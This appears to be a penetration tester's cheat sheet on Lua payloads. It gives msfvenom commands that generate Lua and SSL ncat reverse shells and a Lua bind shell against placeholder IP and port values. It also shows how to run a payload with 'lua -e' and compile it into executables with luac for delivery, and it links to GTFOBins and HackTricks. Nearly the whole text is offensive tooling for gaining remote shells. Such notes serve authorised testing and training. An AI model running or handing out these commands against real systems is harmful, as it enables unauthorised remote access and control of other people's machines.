# Manual

## 01 - Common Files

```
/usr/bin/lua
```

## 02 - Generate Payloads

### 2.1 - Linux

#### 2.1.1 - Reverse Shells

```
$ msfvenom -p cmd/unix/reverse_lua lhost=<IP> lport=<PORT>

$ msfvenom -p cmd/unix/reverse_ncat_ssl handlersslcert=[/path/to/file.pem] sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT>
```

#### 2.1.2 - Bind Shells

```
$ msfvenom -p cmd/unix/bind_lua lport=<PORT>
```

## 03 - Execute Payloads

Single quotes.

```
> lua -e '<payload>'
```

Double quotes.

```
> lua -e "<payload>"
```

## 04 - Compile After Delivery

## 4.1 - Linux

^e48401

```
$ luac -o payload payload.lua
```

## 4.2 - Windows

```
C:\> luac.exe -o payload.exe payload.lua
```

---
## References

- [GTFOBins: Lua](https://gtfobins.github.io/gtfobins/lua/)

- [GTFOBins: Nmap](https://gtfobins.github.io/gtfobins/nmap/)

- [GTFOBins: view](https://gtfobins.github.io/gtfobins/view/)

- [GTFOBins: rview](https://gtfobins.github.io/gtfobins/rview/)

- [GTFOBins: vim](https://gtfobins.github.io/gtfobins/vim/)

- [GTFOBins: vimdiff](https://gtfobins.github.io/gtfobins/vimdiff/)

- [GTFOBins: rvim](https://gtfobins.github.io/gtfobins/rvim/)

### Hacktricks

- [Hacktricks: Shells Linux](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/linux.html)